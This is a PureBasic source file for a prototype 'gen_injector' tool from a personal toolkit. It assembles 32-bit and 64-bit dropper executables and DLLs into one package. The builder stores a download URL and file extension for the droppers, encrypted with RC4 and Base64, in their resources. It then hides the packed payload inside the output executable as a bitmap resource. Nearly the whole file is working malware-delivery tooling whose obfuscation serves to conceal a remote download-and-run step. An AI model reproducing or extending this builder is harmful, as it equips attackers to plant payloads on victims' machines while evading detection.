; ***************************************************************************
; *                                                                         *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; * License:     BSD License                                                *
; * Copyright:   (c) 2012, a12d404.net                                      *
; * Status:      Prototype                                                  *
; *                                                                         *
; ***************************************************************************
EnableExplicit

XIncludeFile("core/utils.pbi")
XIncludeFile("security/rc4_crypto.pbi")
XIncludeFile("filesystem/pefile.pbi")
XIncludeFile("include/inc_dropper.pbi")

; ---------------------------------------------------------------------------
;- Consts


; ---------------------------------------------------------------------------
;- Types


; ---------------------------------------------------------------------------
;- Prototypes


; ---------------------------------------------------------------------------
;- Variables
Define outputFile.s   = ProgramParameter(0)
Define dropper32Exe.s = ProgramParameter(1)
Define dropper32Dll.s = ProgramParameter(2)
Define dropper64Exe.s = ProgramParameter(3)
Define dropper64Dll.s = ProgramParameter(4)
Define url.s          = ProgramParameter(5)
Define urlExt.s       = ProgramParameter(6)


; ---------------------------------------------------------------------------
;- Procedures

; ***************************************************************************
; * Sample -- Does nothing ... really!                                      *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
;Procedure.b Sample(param.l)
;   Define res.b
;   
; SampleCleanup:
;   
;   ProcedureReturn res
; SampleError:
;   res = #False
;   Goto SampleCleanup
;EndProcedure

; ---------------------------------------------------------------------------

; ***************************************************************************
; * UpdateDropper -- Packs all the dropper parts (32bit exe+dll, 64bit exe+ *
; *                  dll) into one package.                                 *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
Procedure.i UpdateDropper(outFileName.s, dropper32Exe.s, dropper32Dll.s, dropper64Exe.s, dropper64Dll.s, url.s, urlExt.s)
  Define res.b
  Define checkSum.s = GenerateChecksum(url)
  Define encryptedUrl.s
  Define encryptedUrlExtension.s
  Define packFilename.s = checkSum + ".pak"
  Define dropper32DllFilename.s = checkSum + "_32.dll"
  Define dropper64DllFilename.s = checkSum + "_64.dll"
  
  ; Copy 32bit dropper
  If Not CopyFile(dropper32Exe, outFileName)
    Goto UpdateDropperError
  EndIf
  
  ; *************************************************************************
  ; * Prepare the 32bit EXE *
  ; *************************
  
  ; add ARCFOUR key
  If Not ResourceAddString(outFileName, #RES_STR_LOCAL_FILE_NAME, checkSum)
    Goto UpdateDropperError
  EndIf
  
  ; encrypt the URL using ARCFOUR + BASE64
  encryptedUrl = rc4_base64_encrypt(@checkSum, StringByteLength(checkSum), url)
  If encryptedUrl = ""
    Goto UpdateDropperError
  EndIf
  
  ; (re)init ARCFOUR encryption
  encryptedUrlExtension = rc4_base64_encrypt(@checkSum, StringByteLength(checkSum), "." + LCase(urlExt))
  If encryptedUrlExtension = ""
    Goto UpdateDropperError
  EndIf
  
  ; Open PACK Payload
  If Not CreatePack(packFilename)
    Goto UpdateDropperError
  EndIf
  
  ; *************************************************************************
  ; * Prepare the 32bit DLL *
  ; *************************
  
  ; Copy 32bit dropper DLL
  If Not CopyFile(dropper32Dll, dropper32DllFilename)
    Goto UpdateDropperError
  EndIf
  
  ; add ARCFOUR key to 32bit dropper DLL
  If Not ResourceAddString(dropper32DllFilename, #RES_STR_LOCAL_FILE_NAME, checkSum)
    Goto UpdateDropperError
  EndIf
  
  ; add the URL to download (encrypted with ARCFOUR+BASE64) to the 32bit dropper DLL
  If Not ResourceAddString(dropper32DllFilename, #RES_STR_URL, encryptedUrl)
    Goto UpdateDropperError
  EndIf
  
  ; add the URL Extension (e.g. EXE, DLL, INF ...)(encrypted with ARCFOUR+BASE64) to the 32bit dropper DLL
  If Not ResourceAddString(dropper32DllFilename, #RES_STR_URL_EXTENSION, encryptedUrlExtension)
    Goto UpdateDropperError
  EndIf
  
  ; add the 32bit dropper DLL
  If Not AddPackFile(dropper32DllFilename, 9)
    Goto UpdateDropperError
  EndIf
  
  ; *************************************************************************
  ; * Prepare the 64bit EXE *
  ; *************************
  
  ; add the 64bit dropper EXE
  If Not AddPackFile(dropper64Exe, 9)
    Goto UpdateDropperError
  EndIf
  
  ; *************************************************************************
  ; * Prepare the 64bit DLL *
  ; *************************
  
  ; Copy 64bit dropper DLL
  If Not CopyFile(dropper64Dll, dropper64DllFilename)
    Goto UpdateDropperError
  EndIf
  
  ; add ARCFOUR key to 64bit dropper DLL
  If Not ResourceAddString(dropper64DllFilename, #RES_STR_LOCAL_FILE_NAME, checkSum)
    Goto UpdateDropperError
  EndIf
  
  ; add the URL to download (encrypted with ARCFOUR+BASE64) to the 64bit dropper DLL
  If Not ResourceAddString(dropper64DllFilename, #RES_STR_URL, encryptedUrl)
    Goto UpdateDropperError
  EndIf
  
  ; add the URL Extension (e.g. EXE, DLL, INF ...)(encrypted with ARCFOUR+BASE64) to the 64bit dropper DLL
  If Not ResourceAddString(dropper64DllFilename, #RES_STR_URL_EXTENSION, encryptedUrlExtension)
    Goto UpdateDropperError
  EndIf
  
  ; add the 64bit dropper DLL
  If Not AddPackFile(dropper64DllFilename, 9)
    Goto UpdateDropperError
  EndIf
  
  ; *************************************************************************
  ; * Add the PACK file to the dropper *
  ; ************************************
  
  ClosePack()
  If Not ResourceAddDataFromFile(outFileName, #RES_PAYLOAD, packFilename, #RT_BITMAP)
    Goto UpdateDropperError
  EndIf
  
  ; *************************************************************************
  
UpdateDropperCleanup:
  If FileSize(dropper64DllFilename) > 0
    DeleteFile(dropper64DllFilename)
  EndIf
  
  If FileSize(dropper32DllFilename) > 0
    DeleteFile(dropper32DllFilename)
  EndIf
  
  If FileSize(packFilename) > 0
    DeleteFile(packFilename)
  EndIf
  
  ProcedureReturn res
UpdateDropperError:
  res = 1
  If FileSize(dropper32Exe) > 0
    DeleteFile(dropper32Exe)
  EndIf
  Goto UpdateDropperCleanup
EndProcedure

; ---------------------------------------------------------------------------

If Not OpenConsole()
  End
EndIf

If CountProgramParameters() = 0
  PrintN("gen_injector.exe [output-filename] [dropper-32bit-filename] [dropper-32bit-dll] [dropper-64bit-filename] [dropper-64bit-dll] [URL] [URL-EXT eg. EXE or DLL]")
  End 1
EndIf

If FileSize(dropper32Exe) < 1
  PrintN("File (" + dropper32Exe + ") not found!")
  End 1
EndIf

If FileSize(dropper32Dll) < 1
  PrintN("File (" + dropper32Dll + ") not found!")
  End 1
EndIf

If FileSize(dropper64Exe) < 1
  PrintN("File (" + dropper64Exe + ") not found!")
  End 1
EndIf

If FileSize(dropper64Dll) < 1
  PrintN("File (" + dropper64Dll + ") not found!")
  End 1
EndIf

If urlExt = ""
  PrintN("URL Extension not defined!")
  End 1
EndIf

End UpdateDropper(outputFile, dropper32Exe, dropper32Dll, dropper64Exe, dropper64Dll, url, urlExt)

; IDE Options = PureBasic 4.60 Beta 3 (Windows - x64)
; CursorPosition = 67
; FirstLine = 55
; Folding = -
; EnableXP
; EnablePurifier
; EnableCompileCount = 0
; EnableBuildCount = 0
; EnableExeConstant